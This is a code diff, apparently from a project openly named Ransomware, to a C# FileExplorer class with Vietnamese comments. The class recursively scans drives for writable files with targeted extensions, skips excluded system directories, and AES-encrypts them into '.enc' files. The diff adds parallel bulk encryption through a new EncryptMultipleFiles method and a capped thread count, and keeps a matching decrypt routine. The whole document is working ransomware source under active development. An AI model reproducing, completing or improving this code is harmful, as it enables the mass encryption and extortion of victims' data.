@@ -3,30 +3,29 @@
 
 using Ransomware.Sources.Utils;
 using System.Collections.Concurrent;
-using System.Text;
-
 
 namespace Ransomware.Sources.Application;
 class FileExplorer
 {
     private bool isRunning;
     private readonly AesCipher aesCipher;
-    private readonly HashSet<string> excludedDirectories; // Danh sách thư mục bị loại trừ
-    private readonly HashSet<string> allowedFileExtensions; // Danh sách định dạng file được cho phép
-    public ConcurrentBag<FileDetail> SpecificFiles { get; private set; } // Danh sách file cụ thể
+    private readonly ParallelOptions parallelOptions;
+    private readonly HashSet<string> excludedDirectories;
+    private readonly HashSet<string> allowedFileExtensions;
+    public ConcurrentBag<FileDetail> SpecificFiles { get; private set; }
 
     public FileExplorer(AesCipher aesCipher)
     {
-        // Khởi tạo danh sách thư mục cần bỏ qua
-        this.excludedDirectories = new HashSet<string>(EnvironmentInspector.DirectoriesToSkip());
-
-        // Khởi tạo danh sách định dạng file cần lưu
-        this.allowedFileExtensions = Config.LoadExtensions();
-
-
-        this.isRunning = true;  
+        this.isRunning = true;
         this.aesCipher = aesCipher;
-        this.SpecificFiles = new ConcurrentBag<FileDetail>();  
+        this.allowedFileExtensions = Config.Extensions();
+        this.SpecificFiles = new ConcurrentBag<FileDetail>();
+        this.excludedDirectories = new HashSet<string>(Config.ExcludedDirectories());
+        this.parallelOptions = new ParallelOptions
+        {
+            MaxDegreeOfParallelism = Environment.ProcessorCount / 2
+        };
+
     }
 
     private bool IsWritable(string path)
@@ -35,17 +34,16 @@ class FileExplorer
         {
             if (File.Exists(path))
             {
-                using (FileStream fs = File.Open(path, FileMode.Open, FileAccess.Write)) { return true; }
+                using FileStream fs = File.Open(path, FileMode.Open, FileAccess.Write);
+                return true;
             }
-            else if (Directory.Exists(path))
+            if (Directory.Exists(path))
             {
-                var dirInfo = new DirectoryInfo(path);
-                return !dirInfo.Attributes.HasFlag(FileAttributes.ReadOnly);
+                return !new DirectoryInfo(path).Attributes.HasFlag(FileAttributes.ReadOnly);
             }
         }
         catch (UnauthorizedAccessException) { return false; }
         catch (IOException) { return false; }
-
         return false;
     }
 
@@ -53,30 +51,30 @@ class FileExplorer
     {
         try
         {
-            // Bỏ qua thư mục
-            if (this.excludedDirectories.Contains(path) || path.StartsWithAny(this.excludedDirectories)) 
-                return;
+            // Kiểm tra xem thư mục có nằm trong danh sách bị loại trừ không
+            if (this.excludedDirectories.Contains(path) || this.excludedDirectories.Any(path.StartsWith)) return;
 
-            // Lấy các file trong thư mục
+            // Lấy danh sách tệp tin trong thư mục
             var files = Directory.EnumerateFiles(path)
-                .Where(file => this.allowedFileExtensions.Contains(Path.GetExtension(file))) 
+                .Where(file => this.allowedFileExtensions.Contains(Path.GetExtension(file)))
                 .ToList();
 
-            Parallel.ForEach(files, (file) =>
+            // Xử lý tệp tin trong thư mục
+            Parallel.ForEach(files, this.parallelOptions, file =>
             {
                 if (IsWritable(file))
                 {
-                    long fileSize = new FileInfo(file).Length; // Lấy kích thước file
-                    this.SpecificFiles.Add(new FileDetail(file, fileSize)); 
+                    long fileSize = new FileInfo(file).Length;
+                    SpecificFiles.Add(new FileDetail(file, fileSize));
                 }
             });
 
-            // Lấy các thư mục con
+            // Lấy danh sách thư mục con trong thư mục
             var directories = Directory.EnumerateDirectories(path)
-                .Where(dir => !this.excludedDirectories.Contains(dir) && !dir.StartsWithAny(this.excludedDirectories)) 
+                .Where(dir => !excludedDirectories.Any(dir.StartsWith))
                 .ToList();
 
-            // Xử lý các thư mục con
+            // Xử lý các thư mục con bằng cách gọi đệ quy
             Parallel.ForEach(directories, FindFiles); // Gọi trực tiếp phương thức
         }
         catch (UnauthorizedAccessException)
@@ -91,71 +89,73 @@ class FileExplorer
 
     public void EncryptFile(string filePath, long fileSize)
     {
-        string outputPath = Path.ChangeExtension(filePath, ".enc");
+        string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(filePath);
+        string directoryName = Path.GetDirectoryName(filePath) ?? string.Empty;
+        string outputPath = Path.Combine(directoryName, $"{fileNameWithoutExtension}.enc");
+
         int bufferSize = (int)Math.Min(fileSize, 8192);
 
-        using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
-        using (FileStream outputFileStream = new FileStream(outputPath, FileMode.Create, FileAccess.Write))
-        {
-            byte[] buffer = new byte[bufferSize];
-            int bytesRead;
+        using FileStream inputFileStream = new(filePath, FileMode.Open, FileAccess.Read);
+        using FileStream outputFileStream = new(outputPath, FileMode.Create, FileAccess.Write);
+        using BufferedStream bufferedOutputStream = new(outputFileStream); // Sử dụng BufferedStream
 
-            // Đọc từng phần của tệp và mã hóa
-            while ((bytesRead = inputFileStream.Read(buffer, 0, buffer.Length)) > 0)
-            {
-                // Mã hóa dữ liệu đọc được
-                byte[] encryptedData = this.aesCipher.Encrypt(Encoding.UTF8.GetString(buffer, 0, bytesRead));
-                outputFileStream.Write(encryptedData, 0, encryptedData.Length);
-            }
+        byte[] buffer = new byte[bufferSize];
+        int bytesRead;
+
+        while ((bytesRead = inputFileStream.Read(buffer, 0, buffer.Length)) > 0)
+        {
+            // Mã hóa dữ liệu với byte array
+            byte[] encryptedData = this.aesCipher.Encrypt(buffer.AsSpan(0, bytesRead).ToArray());
+            bufferedOutputStream.Write(encryptedData, 0, encryptedData.Length); // Ghi vào BufferedStream
         }
     }
 
-    // Phương thức giải mã tệp theo từng phần
     public void DecryptFile(string filePath, long fileSize)
     {
-        string outputPath = Path.ChangeExtension(filePath, null); // Bỏ phần mở rộng
+        string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(filePath);
+        string directoryName = Path.GetDirectoryName(filePath) ?? string.Empty;
+        string outputPath = Path.Combine(directoryName, fileNameWithoutExtension);
+
         int bufferSize = (int)Math.Min(fileSize, 8192);
 
-        using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
-        using (FileStream outputFileStream = new FileStream(outputPath, FileMode.Create, FileAccess.Write))
-        {
-            byte[] buffer = new byte[bufferSize];
-            int bytesRead;
+        using FileStream inputFileStream = new(filePath, FileMode.Open, FileAccess.Read);
+        using FileStream outputFileStream = new(outputPath, FileMode.Create, FileAccess.Write);
 
-            // Đọc từng phần của tệp và giải mã
-            while ((bytesRead = inputFileStream.Read(buffer, 0, buffer.Length)) > 0)
-            {
-                // Giải mã dữ liệu đọc được
-                string decryptedData = this.aesCipher.Decrypt(buffer.Take(bytesRead).ToArray());
-                byte[] dataToWrite = Encoding.UTF8.GetBytes(decryptedData);
-                outputFileStream.Write(dataToWrite, 0, dataToWrite.Length);
-            }
+        byte[] buffer = new byte[bufferSize];
+        int bytesRead;
+
+        while ((bytesRead = inputFileStream.Read(buffer, 0, buffer.Length)) > 0)
+        {
+            // Giải mã dữ liệu
+            byte[] decryptedData = this.aesCipher.Decrypt(buffer.AsSpan(0, bytesRead).ToArray());
+            outputFileStream.Write(decryptedData, 0, decryptedData.Length); // Ghi trực tiếp byte array
         }
     }
 
-    public enum SortOrder
+    public void EncryptMultipleFiles(IEnumerable<string> filePaths)
     {
-        Ascending,  // Từ nhỏ đến lớn
-        Descending  // Từ lớn đến nhỏ
+        Parallel.ForEach(filePaths, this.parallelOptions, filePath =>
+        {
+            EncryptFile(filePath, new FileInfo(filePath).Length);
+        });
     }
 
     public List<FileDetail> Scan(long minimumSize = 1024 * 1024, SortOrder sortOrder = SortOrder.Ascending)
     {
-        if (this.isRunning) 
+        if (this.isRunning)
         {
-            FindFiles(EnvironmentInspector.Root());
+            FindFiles(Config.Root());
             this.isRunning = false;
         }
 
-        // Lọc và sắp xếp theo kích thước dựa trên kiểu sắp xếp
         return sortOrder == SortOrder.Descending
-            ? this.SpecificFiles
-                .Where(fileDetail => fileDetail.Size > minimumSize)
-                .OrderByDescending(fileDetail => fileDetail.Size) // Sắp xếp từ lớn đến nhỏ
-                .ToList() // Chuyển đổi sang List<FileDetail>
-            : this.SpecificFiles
-                .Where(fileDetail => fileDetail.Size > minimumSize)
-                .OrderBy(fileDetail => fileDetail.Size) // Sắp xếp từ nhỏ đến lớn
-                .ToList(); // Chuyển đổi sang List<FileDetail>
+            ? this.SpecificFiles.Where(file => file.Size > minimumSize).OrderByDescending(file => file.Size).ToList()
+            : this.SpecificFiles.Where(file => file.Size > minimumSize).OrderBy(file => file.Size).ToList();
+    }
+
+    public enum SortOrder
+    {
+        Ascending,
+        Descending
     }
 }
